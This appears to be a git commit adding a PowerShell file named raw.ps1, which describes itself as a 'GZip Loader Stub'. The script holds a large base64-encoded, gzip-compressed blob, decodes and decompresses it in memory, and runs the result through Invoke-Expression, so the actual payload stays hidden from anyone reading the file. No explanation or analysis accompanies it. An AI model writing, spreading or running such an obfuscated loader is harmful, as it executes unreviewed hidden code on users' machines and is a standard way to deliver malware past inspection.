6edc8571ce96f4192a551246de919c5bd06da424
kendamon17-create <kendamon17@gmail.com>
2026-07-10 20:36:29 -0700

    Add files via upload

---
+++ raw.ps1
@@ -0,0 +1,61 @@
+﻿# GZip Loader Stub - Generated on 2026-07-10 20:00:55
+# Original Size: 7560 bytes | Compressed: 2451 bytes
+
+$b = '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' 
+
+# Decode from Base64
+$g = [System.Convert]::FromBase64String($b)
+
+# Decompress using GZipStream
+$m = New-Object System.IO.MemoryStream(, $g)
+$d = New-Object System.IO.MemoryStream
+$z = New-Object System.IO.Compression.GZipStream($m, [IO.Compression.CompressionMode]::Decompress)
+$z.CopyTo($d)
+
+# Read the decompressed script
+$d.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
+$r = New-Object System.IO.StreamReader($d)
+$s = $r.ReadToEnd()
+
+# Execute
+$s | Invoke-Expression
